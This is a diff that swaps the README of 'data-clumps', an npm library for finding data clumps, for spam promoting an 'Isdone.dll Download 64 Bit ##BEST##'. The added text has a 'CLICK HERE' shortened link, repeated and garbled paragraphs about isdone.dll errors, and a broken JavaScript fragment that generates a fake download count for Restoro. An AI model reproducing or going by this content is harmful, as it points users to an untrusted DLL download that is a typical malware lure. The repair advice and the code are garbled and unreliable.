@@ -1,49 +1,22 @@
-<h2 align="center">
-    data-clumps
-</h2>
+# Isdone.dll Download 64 Bit ##BEST## # 
 
-<p align="center">
-  <a href="https://badge.fury.io/js/data-clumps.svg"><img src="https://badge.fury.io/js/data-clumps.svg" alt="npm package" /></a>
-  <a href="https://img.shields.io/github/license/FireboltCasters/data-clumps"><img src="https://img.shields.io/github/license/FireboltCasters/data-clumps" alt="MIT" /></a>
-  <a href="https://img.shields.io/github/last-commit/FireboltCasters/data-clumps?logo=git"><img src="https://img.shields.io/github/last-commit/FireboltCasters/data-clumps?logo=git" alt="last commit" /></a>
-  <a href="https://www.npmjs.com/package/data-clumps"><img src="https://img.shields.io/npm/dm/data-clumps.svg" alt="downloads week" /></a>
-  <a href="https://www.npmjs.com/package/data-clumps"><img src="https://img.shields.io/npm/dt/data-clumps.svg" alt="downloads total" /></a>
-  <a href="https://github.com/FireboltCasters/data-clumps"><img src="https://shields.io/github/languages/code-size/FireboltCasters/data-clumps" alt="size" /></a>
-  <a href="https://github.com/google/gts" alt="Google TypeScript Style"><img src="https://img.shields.io/badge/code%20style-google-blueviolet.svg"/></a>
-  <a href="https://shields.io/" alt="Google TypeScript Style"><img src="https://img.shields.io/badge/uses-TypeScript-blue.svg"/></a>
-  <a href="https://github.com/marketplace/actions/lint-action"><img src="https://img.shields.io/badge/uses-Lint%20Action-blue.svg"/></a>
-  <a href="https://github.com/FireboltCasters/data-clumps/actions/workflows/npmPublish.yml"><img src="https://github.com/FireboltCasters/data-clumps/actions/workflows/npmPublish.yml/badge.svg" alt="Npm publish" /></a>
-</p>
 
-## About
+CLICK HERE --->>> [https://shurll.com/2tiFZ5](https://shurll.com/2tiFZ5)
 
-A library to parse files and folders to check for data clumps and refactor them.
 
-## Demo
-
-https://fireboltcasters.github.io/data-clumps/
-
-## Installtion
-
-```
-npm install data-clumps
-```
-
-## Usage example
-
-```javascript
-import {Parser} from 'data-clumps';
-
-async function exampleParse() {
-
-}
 ```
 
 
+this system file is deleted, shifted, corrupted, or changed the registry also causes isdone.dll error. you do not need to worry about this error. because this is a common error in windows 7/8/10 os and you can easily fix this isdone.
 
 
-## Contributors
+when you install an application on a windows computer, there are quite a few things that can go wrong and tons of different error messages that can appear if something does go wrong. one of these error messages is one that says something along the lines of isdone.dll is missing. isdone.dll is a file that, with all the other.dll files, resides inside the system32 folder on 32-bit systems and the syswow64 folder on 64-bit systems.
 
-The FireboltCasters
 
-<a href="https://github.com/FireboltCasters/data-clumps"><img src="https://contrib.rocks/image?repo=FireboltCasters/data-clumps" alt="Contributors" /></a>
+the most probable reason for failing to run isdone.dll is that your computer does not have sufficient ram memory or hard disk space. this system file is deleted, shifted, corrupted, or changed the registry also causes isdone.dll error. you do not need to worry about this error. because this is a common error in windows 7/8/10 os and you can easily fix this isdone.
+
+
+function gennr()var n=480678,t=new date,e=t.getmonth()+1,r=t.getday(),a=parsefloat(0.+string(e)+r);return new intl.numberformat('en-us').format(math.round(569086*a+n))var rng=document.queryselector(#restoro-downloads);rng.innerhtml=gennr();rng.removeattribute(id);var restorodownloadlink=document.queryselector(#restoro-download-link),restorodownloadarrow=document.queryselector(.restoro-download-arrow),restoroclosearrow=document.queryselector(#close-restoro-download-arrow);restorodownloadlink.addeventlistener(click,function()settimeout(function()restorodownloadarrow.style.display=flex,500),restoroclosearrow.addeventlistener(click,function()restorodownloadarrow.display=none)); the donnell error message is one that occasionally pops up when installing or running games in windows 10. 84d34552a1
+
+
+```
